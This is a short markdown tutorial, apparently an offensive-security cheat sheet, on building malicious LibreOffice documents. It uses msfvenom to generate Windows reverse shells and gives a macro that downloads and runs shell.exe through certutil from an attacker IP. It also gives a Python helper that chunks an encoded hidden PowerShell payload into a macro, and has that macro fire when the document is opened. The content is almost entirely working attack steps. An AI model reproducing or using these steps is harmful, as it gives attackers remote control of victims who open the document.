# Open Office

### 1. Way

First, you need to install libreoffice.

```
$ sudo apt install libreoffice
```

Create an odt file.

Adding macro:

Tools -> Macros -> Organize Macros -> Basic -> Select the document -> New(Macro Name module)

Then edit the macro:

Select Macro Name -> Edit

We should create a executable for shell.

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.147 LPORT=80 -f exe -o shell.exe
```

Add these contents to macro page.

```
Sub Evil
    Shell("certutil.exe -urlcache -split -f http://192.168.49.147:8080/shell.exe C:\Windows\Temp\shell.exe && \Windows\Temp\shell.exe")
End Sub
```

Finally, we will make a creation of trigger to execute our macro.

Tools -> Customize -> Events -> Select "Open Document" -> Click: “Assign: Macro” -> Select the document's macro which name is Evil.

### 2. Way

First, you need to install libreoffice.

```
$ sudo apt install libreoffice
```

Create an odt file.

Adding macro:

Tools -> Macros -> Organize Macros -> Basic -> Select the document -> New(Macro Name module)

Then edit the macro:

Select Macro Name -> Edit

We will create an evil payload for shell.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.175 LPORT=443 -f hta-psh -o evil.hta

Inside this file, we can find the following command. 
Paste contents of it to str variable in vba.py.
"powershell.exe -nop -w hidden -e aQBmACg......"
```

VBA has a 255-character limit for literal strings, but this restriction does not apply to strings stored in variables.

**vba.py:**

```
#!/usr/bin/python

str = "cmd.exe /c powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdA..."

n=50

for i in range(0, len(str), n):
	print "Str = Str + " + '"'+ str[i:i+n] + '"'
```

Our goal is to transform this string workable, as follows. Finally, macro should be look like this.

```
Sub Evil

	Dim Str As String
	
	Str = Str + "cmd.exe /c powershell.exe -nop -w hidden -e aQBmAC"
	Str = Str + "gAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEA"
	Str = Str + "IAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALg"
	Str = Str + "BlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3"
	...
	Str = Str + "AFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAH"
	Str = Str + "kAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAA"
	Str = Str + "cgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOw"
	Str = Str + "A="
	
	Shell(Str)
	
End Sub
```

Finally, we will make a creation of trigger to execute our macro.

Tools -> Customize -> Events -> Select "Open Document" -> Click: “Assign: Macro” -> Select the document's macro which name is Evil.
